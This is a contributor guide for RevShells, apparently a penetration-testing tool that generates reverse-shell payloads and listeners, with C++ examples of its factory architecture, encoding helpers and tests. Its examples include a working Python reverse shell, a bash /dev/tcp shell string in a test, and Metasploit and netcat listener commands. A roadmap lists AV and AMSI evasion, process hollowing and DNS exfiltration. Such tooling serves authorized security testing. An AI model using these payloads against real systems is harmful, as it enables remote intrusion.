# Development Guide

This document provides detailed instructions for developers who want to extend or contribute to the RevShells project.

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Adding New Payloads](#adding-new-payloads)
3. [Adding New Listeners](#adding-new-listeners)
4. [Extending Encoding Methods](#extending-encoding-methods)
5. [Code Patterns and Conventions](#code-patterns-and-conventions)
6. [Testing](#testing)
7. [Debugging](#debugging)

## Architecture Overview

The application follows a factory pattern with clear separation of concerns:

```
src/
├── core/
│   ├── Options.h          # Configuration enums and structs
│   ├── InterfacePayload.h # Abstract payload interface
│   └── InterfaceListener.h # Abstract listener interface
├── payloads/
│   ├── PayloadFactory.h   # Payload factory class
│   ├── PayloadFactory.cpp # Platform-specific generation logic
│   └── implementations/   # Concrete payload implementations
├── listeners/
│   ├── ListenerFactory.h  # Listener factory and registry
│   └── implementations/   # Concrete listener implementations
└── utils/
    └── [Encoding utilities]
```

### Key Design Principles

1. **Interface Segregation**: Each component implements minimal interfaces
2. **Open/Closed Principle**: Extensible without modifying existing code
3. **Factory Pattern**: Centralized creation and management
4. **Single Responsibility**: Each class has one clear purpose

## Adding New Payloads

### Step 1: Create the Payload Class

Create a new header file in `src/payloads/implementations/`:

```cpp
// src/payloads/implementations/Python_Payload.h
#pragma once

#include "../../core/InterfacePayload.h"
#include "../../core/Options.h"
#include <string>

class PythonPayload : public IPayload {
public:
    std::string name() const override;
    std::string generate(const Options& opts) const override;
    std::string listener(const Options& opts) const override;
};
```

### Step 2: Implement the Payload Class

Create the corresponding implementation file:

```cpp
// src/payloads/implementations/Python_Payload.cpp
#include "Python_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string PythonPayload::name() const {
    return "python";
}

std::string PythonPayload::generate(const Options& opts) const {
    // Generate Python reverse shell payload
    return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + 
           opts.host + "\"," + std::to_string(opts.port) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
}

std::string PythonPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}
```

### Step 3: Register the Payload

Add your payload to the factory in `PayloadFactory.cpp`:

```cpp
// In PayloadFactory constructor
PayloadFactory::PayloadFactory() {
    // Existing registrations...
    registry_["python"] = std::make_unique<PythonPayload>();
}
```

### Step 4: Update CMake Build Configuration

Add your new payload files to the appropriate CMakeLists.txt:

```cmake
# In src/payloads/CMakeLists.txt
set(PAYLOAD_SOURCES
    PayloadFactory.cpp
    implementations/Python_Payload.cpp
    # Add other existing implementations...
)

# In src/listeners/CMakeLists.txt  
set(LISTENER_SOURCES
    # Header-only implementations, add if needed
)
```

### Step 5: Add to Factory Registration

The PayloadFactory uses a registry pattern. Add your payload to the factory constructor:

```cpp
// In PayloadFactory constructor
PayloadFactory::PayloadFactory() {
    // Existing registrations for 25+ payload types...
    registry_["python"] = std::make_unique<PythonPayload>();
}

## Adding New Listeners

### Step 1: Create the Listener Class

Create a new header file in `src/listeners/implementations/`:

```cpp
// src/listeners/implementations/Metasploit_Listener.h
#pragma once

#include "../../core/InterfaceListener.h"
#include "../../core/Options.h"
#include <string>

class MetasploitListener : public IListener {
public:
    std::string name() const override;
    std::string command(const Options& opts) const override;
};
```

### Step 2: Implement the Listener Class

```cpp
// src/listeners/implementations/Metasploit_Listener.cpp
#include "Metasploit_Listener.h"

std::string MetasploitListener::name() const {
    return "metasploit";
}

std::string MetasploitListener::command(const Options& opts) const {
    return "msfconsole -x \"use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST " + 
           opts.host + "; set LPORT " + std::to_string(opts.port) + "; exploit\"";
}
```

### Step 3: Register the Listener

Add your listener to the factory in `ListenerFactory.h`:

```cpp
// Add include
#include "implementations/Metasploit_Listener.h"

// In ListenerFactory constructor
ListenerFactory::ListenerFactory() {
    // Existing registrations...
    registry_["metasploit"] = std::make_unique<MetasploitListener>();
}
```

## Extending Encoding Methods

### Step 1: Add New Encoding Type

Add your encoding type to the enum in `src/core/Options.h`:

```cpp
enum class Encoding {
    NONE,
    URL,
    DOUBLE_URL,
    BASE64,
    HEX,        // New encoding type
    ROT13       // Another new encoding type
};
```

### Step 2: Implement Encoding Functions

Add the encoding functions to `PayloadFactory.cpp`:

```cpp
std::string PayloadFactory::hexEncode(const std::string& input) const {
    std::ostringstream encoded;
    encoded << std::hex;
    for (unsigned char c : input) {
        encoded << std::setw(2) << std::setfill('0') << static_cast<int>(c);
    }
    return encoded.str();
}

std::string PayloadFactory::rot13Encode(const std::string& input) const {
    std::string encoded = input;
    for (char& c : encoded) {
        if (c >= 'A' && c <= 'Z') {
            c = 'A' + (c - 'A' + 13) % 26;
        } else if (c >= 'a' && c <= 'z') {
            c = 'a' + (c - 'a' + 13) % 26;
        }
    }
    return encoded;
}
```

### Step 3: Add to Encoding Switch

Update the `applyEncoding` method:

```cpp
std::string PayloadFactory::applyEncoding(const std::string& payload, const Options& opts) const {
    switch (opts.encoding) {
        case Encoding::BASE64:
            return base64Encode(payload);
        case Encoding::URL:
            return urlEncode(payload);
        case Encoding::DOUBLE_URL:
            return doubleUrlEncode(payload);
        case Encoding::HEX:
            return hexEncode(payload);
        case Encoding::ROT13:
            return rot13Encode(payload);
        case Encoding::NONE:
        default:
            return payload;
    }
}
```

### Step 4: Update Supported Encodings

Update the `getSupportedEncodings` method:

```cpp
std::vector<std::string> PayloadFactory::getSupportedEncodings() const {
    return {"none", "base64", "url", "double_url", "hex", "rot13"};
}
```

## Code Patterns and Conventions

### Naming Conventions

- **Classes**: PascalCase (e.g., `PayloadFactory`, `BashPayload`)
- **Methods**: camelCase (e.g., `generatePayload`, `applyEncoding`)
- **Variables**: camelCase (e.g., `payloadType`, `hostAddress`)
- **Constants**: UPPER_SNAKE_CASE (e.g., `DEFAULT_PORT`, `MAX_RETRIES`)
- **Files**: Match class names (e.g., `PayloadFactory.h`, `PayloadFactory.cpp`)

### Error Handling

Use consistent error handling patterns:

```cpp
// Good: Return empty string or throw exception
std::string PayloadFactory::generate(const std::string& type, const Options& opts) const {
    auto it = registry_.find(type);
    if (it == registry_.end()) {
        return "";  // Or throw std::invalid_argument("Unknown payload type: " + type);
    }
    return it->second->generate(opts);
}

// Validation
if (opts.host.empty() || opts.port <= 0 || opts.port > 65535) {
    throw std::invalid_argument("Invalid host or port configuration");
}
```

### Memory Management

Use smart pointers for automatic memory management:

```cpp
// Good: Use unique_ptr for single ownership
std::unordered_map<std::string, std::unique_ptr<IPayload>> registry_;

// Good: Use shared_ptr for shared ownership
std::shared_ptr<IPayload> payload = std::make_shared<BashPayload>();
```

### Include Guards

Use `#pragma once` for header files:

```cpp
// Good: Modern include guard
#pragma once

// Avoid: Traditional include guards
#ifndef PAYLOAD_FACTORY_H
#define PAYLOAD_FACTORY_H
// ...
#endif
```

## Testing

### Unit Testing Structure

Create test files in the `tests/` directory:

```cpp
// tests/test_payload_factory.cpp
#include "../src/payloads/PayloadFactory.h"
#include <gtest/gtest.h>

class PayloadFactoryTest : public ::testing::Test {
protected:
    PayloadFactory factory;
    Options opts;
    
    void SetUp() override {
        opts.host = "127.0.0.1";
        opts.port = 4444;
        opts.platform = Platform::LINUX;
        opts.payloadType = PayloadType::REVERSE;
    }
};

TEST_F(PayloadFactoryTest, GenerateLinuxBashPayload) {
    opts.interpreter = "bash";
    std::string payload = factory.generateByType(opts);
    EXPECT_TRUE(payload.find("bash -i >& /dev/tcp/127.0.0.1/4444 0>&1") != std::string::npos);
}

TEST_F(PayloadFactoryTest, Base64Encoding) {
    opts.encoding = Encoding::BASE64;
    std::string payload = factory.generateByType(opts);
    EXPECT_FALSE(payload.find("bash") != std::string::npos); // Should be encoded
}
```

### Integration Testing

Test complete workflows:

```cpp
TEST_F(PayloadFactoryTest, EndToEndWorkflow) {
    // Test payload generation
    std::string payload = factory.generateByType(opts);
    EXPECT_FALSE(payload.empty());
    
    // Test listener generation
    opts.listenerType = "nc";
    std::string listener = factory.listener("nc", opts);
    EXPECT_TRUE(listener.find("nc -lvnp 4444") != std::string::npos);
}
```

## Debugging

### Debug Builds

Use debug flags for development:

```bash
# Debug build with symbols
cmake -DCMAKE_BUILD_TYPE=Debug ..
make

# Run with debugger
gdb ./revshells
```

### Logging

Add logging for debugging:

```cpp
#ifdef DEBUG
#include <iostream>
#define DEBUG_LOG(msg) std::cout << "[DEBUG] " << msg << std::endl
#else
#define DEBUG_LOG(msg)
#endif

// Usage
DEBUG_LOG("Generating payload for platform: " << static_cast<int>(opts.platform));
```

### Common Issues

1. **Include Path Problems**: Ensure relative paths are correct after reorganization
2. **Missing Registry Entries**: Remember to register new implementations in factories
3. **Encoding Issues**: Test encoding functions with various input types
4. **Memory Leaks**: Use smart pointers and RAII patterns

## Performance Considerations

### Optimization Tips

1. **Use const references** for large objects:
```cpp
std::string generate(const Options& opts) const;  // Good
std::string generate(Options opts) const;         // Avoid copying
```

2. **Reserve vector capacity** when size is known:
```cpp
std::vector<std::string> names;
names.reserve(registry_.size());
```

3. **Use string_view** for read-only string operations (C++17):
```cpp
#include <string_view>
bool isValidShell(std::string_view shell);
```

## Contributing Guidelines

1. **Fork the repository** and create a feature branch
2. **Follow coding conventions** outlined in this document
3. **Add tests** for new functionality
4. **Update documentation** for new features
5. **Submit a pull request** with clear description

### Pull Request Checklist

- [ ] Code follows project conventions
- [ ] Tests added and passing
- [ ] Documentation updated
- [ ] No memory leaks (valgrind clean)
- [ ] Cross-platform compatibility tested
- [ ] Security considerations addressed

## Current Implementation Status

The project currently includes:

### Implemented Payloads (25+)
- **Bash variants**: Interactive (`bash -i`), /dev/tcp, readline, UDP
- **C implementations**: Linux C, Windows C, C# variants  
- **Scripting languages**: PHP (PentestMonkey/Ivan), Perl (multiple variants)
- **Network tools**: Multiple netcat variants, Ncat implementations, Rustcat
- **Encrypted shells**: OpenSSL, TLS-enabled connections
- **Specialized**: curl-based, Haskell, BusyBox variants

### Implemented Listeners (17+)
- **Netcat variants**: Standard nc, BusyBox nc, FreeBSD nc
- **Enhanced tools**: Ncat, Ncat with TLS, pwncat, rustcat  
- **Advanced listeners**: socat, socat with TTY, OpenSSL
- **Framework integration**: Metasploit handler, Hoaxshell
- **Windows support**: ConPTY, PowerCat, Windows-specific variants

### Supported Features
- **Multi-platform**: Linux, Windows, macOS payload generation
- **Encoding**: Base64, URL encoding, double URL encoding
- **Interfaces**: Both CLI and Qt6 GUI applications
- **Extensible architecture**: Factory pattern for easy additions

## Future Enhancements

Potential areas for contribution:

1. **New Payload Types**: Python, Ruby, Go, additional language implementations
2. **Advanced Encodings**: AES encryption, XOR, custom obfuscation methods
3. **Network Protocols**: HTTP/HTTPS tunneling, DNS exfiltration, WebSocket shells
4. **Evasion Techniques**: Anti-AV, AMSI bypass, process hollowing
5. **Configuration Management**: JSON/YAML profiles, saved configurations
6. **Automation Features**: Batch payload generation, testing frameworks

⚠️ **Ethical Use Reminder**: All contributions must align with responsible disclosure and authorized testing guidelines. This tool is designed for educational and legitimate security testing purposes only.